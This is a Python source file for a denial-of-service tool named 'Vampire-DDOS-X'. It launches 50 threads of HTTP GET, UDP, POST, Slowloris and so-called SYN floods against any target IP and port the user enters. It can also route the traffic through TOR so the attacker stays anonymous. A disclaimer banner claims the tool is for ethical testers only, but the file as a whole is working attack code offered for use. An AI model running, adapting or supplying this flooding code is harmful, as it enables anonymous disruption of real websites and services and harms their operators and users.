import os
import sys
import time
import socket
import threading
import random
import subprocess
import getpass
from colorama import Fore, Style, init
import socks
import hashlib

# Auto-install required modules
def install(module, pip_name=None):
    pip_name = pip_name or module
    try:
        __import__(module)
    except ImportError:
        subprocess.call([sys.executable, '-m', 'pip', 'install', pip_name])

install("colorama")
install("socks", "pysocks")

init(autoreset=True)

# Admin Passwords
ADMIN_PASSWORD = "SH404"
TOR_PASSWORD = "SH404"

# Global Counters
requests_sent = 0
threads_running = 0
attack_active = True

# Banners
admin_banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════╗
║       █████▒▒▒ ADMIN PANEL ▒▒▒█████         ║
║    ╔═╗╔═╗╔╦╗╔═╗╦═╗╦╔═╗╔═╗╔═╗  ╔═╗╦ ╦         ║
║    ╚═╗║╣  ║║║╣ ╠╦╝║║ ╦║╣ ╚═╗  ║ ╦║ ║         ║
║    ╚═╝╚═╝═╩╝╚═╝╩╚═╩╚═╝╚═╝╚═╝  ╚═╝╚═╝         ║
║            [Vampire-DDOS-X]                 ║
║        Developed by: Muhammad Shourov       ║
╚══════════════════════════════════════════════╝
"""

user_banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════╗
║       █████▒▒▒ USER PANEL ▒▒▒█████          ║
║    ██    ██ ██████  ██████  ██    ██        ║
║    ██    ██ ██   ██ ██   ██ ██    ██        ║
║    ██    ██ ██████  ██████  ██    ██        ║
║    ██    ██ ██      ██      ██    ██        ║
║     ██████  ██      ██       ██████         ║
║          [Vampire-DDOS-X]                   ║
║      Created by: Muhammad Shourov           ║
╚══════════════════════════════════════════════╝
"""

def show_disclaimer():
    from itertools import cycle

    colors = cycle([
        Fore.RED, Fore.LIGHTRED_EX, Fore.YELLOW, Fore.LIGHTYELLOW_EX,
        Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.CYAN, Fore.LIGHTCYAN_EX
    ])
    text_lines = [
        "╔════════════════════════════════════════════════════════════════╗",
        "║ ██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗   ██╗███████╗██████╗   ║",
        "║ ██║   ██║██╔══██╗████╗ ████║██╔══██╗██║   ██║██╔════╝██╔══██╗  ║",
        "║ ██║   ██║███████║██╔████╔██║██████╔╝██║   ██║█████╗  ██████╔╝  ║",
        "║ ╚██╗ ██╔╝██╔══██║██║╚██╔╝██║██╔═══╝ ██║   ██║██╔══╝  ██╔══██╗  ║",
        "║  ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██║     ╚██████╔╝███████╗██║  ██║  ║",
        "║   ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║",
        "╠════════════════════════════════════════════════════════════════╣",
        "║ WARNING: This tool is a DIGITAL WEAPON.                       ║",
        "║ Unauthorized use can lead to SERIOUS LEGAL CONSEQUENCES.     ║",
        "║                                                               ║",
        "║ This tool is strictly for:                                    ║",
        "║   → Cybersecurity Experts                                     ║",
        "║   → Ethical Hackers (with permission)                         ║",
        "║   → Legal Penetration Testers                                 ║",
        "║                                                               ║",
        "║ Misuse = YOU are FULLY RESPONSIBLE.                          ║",
        "║ We (Vampire Squad) take NO LIABILITY.                        ║",
        "║                                                               ║",
        "║ → Developed by: Muhammad Shourov aka VAMPIRE                 ║",
        "║ → Team: Vampire Squad | GitHub: github.com/vampiresquad     ║",
        "╚════════════════════════════════════════════════════════════════╝",
        "[!] Press Ctrl+C now if you're not fully authorized..."
    ]

    for line in text_lines:
        color = next(colors)
        for char in line:
            sys.stdout.write(color + char + Style.RESET_ALL)
            sys.stdout.flush()
            time.sleep(0.002)  # Slow glitch effect
        print()
        time.sleep(0.05)

def install_tor():
    try:
        subprocess.call(['pkg', 'install', '-y', 'tor'])
    except:
        print("[!] TOR installation failed. Please install manually.")

def enable_tor():
    print("[?] Enable Anonymous Mode (TOR)? (y/n): ", end='')
    if input().lower() == 'y':
        password = getpass.getpass("Enter TOR password: ")
        if password == TOR_PASSWORD:
            print("[✓] Enabling TOR routing...")
            install_tor()
            os.system("tor &")
            time.sleep(5)
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            print("[✓] TOR routing enabled.")
        else:
            print("[!] Wrong TOR password. Skipping...")

# Dynamic Payload Generation for Enhanced Attack
def generate_payload(size=1024):
    """ Generate a random payload of specified size """
    return random._urandom(size)

# Enhanced attack methods
def attack(target, port, attack_type):
    global requests_sent, threads_running, attack_active
    threads_running += 1
    try:
        while attack_active:
            try:
                if attack_type == "2":  # UDP Flood
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    payload = generate_payload(1024)
                    s.sendto(payload, (target, port))
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    if attack_type == "1":  # HTTP Flood
                        req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                        s.send(req.encode())
                    elif attack_type == "3":  # SYN Flood
                        payload = generate_payload(2048)
                        s.send(payload)
                    elif attack_type == "4":  # Slowloris Attack
                        for _ in range(50):
                            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                            time.sleep(0.5)
                    elif attack_type == "5":  # POST Flood
                        payload = "username=admin&password=admin"
                        headers = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{payload}"
                        s.send(headers.encode())
                requests_sent += 1
                if requests_sent % 100 == 0:
                    print(f"[+] Sent {requests_sent} requests to {target}:{port}")
            except Exception as e:
                print(f"[!] Error: {e}")
                break
    finally:
        threads_running -= 1

def start_attack(target, port, attack_type):
    print(f"[*] Starting attack on {target}:{port} using attack type {attack_type}...")
    for _ in range(50):  # Start 50 threads (can be adjusted)
        threading.Thread(target=attack, args=(target, port, attack_type)).start()

def main():
    show_disclaimer()
    print(user_banner)
    enable_tor()
    print("[*] Starting the attack options...")
    
    while True:
        print(f"{Fore.GREEN}[1] HTTP Flood")
        print(f"{Fore.GREEN}[2] UDP Flood")
        print(f"{Fore.GREEN}[3] SYN Flood")
        print(f"{Fore.GREEN}[4] Slowloris")
        print(f"{Fore.GREEN}[5] POST Flood")
        print(f"{Fore.RED}[0] Exit")
        choice = input("Choose attack type (0-5): ")

        if choice == "0":
            print("[*] Exiting...")
            break

        target = input("Enter target IP or Domain: ")
        port = int(input("Enter port number: "))
        start_attack(target, port, choice)

if __name__ == "__main__":
    main()
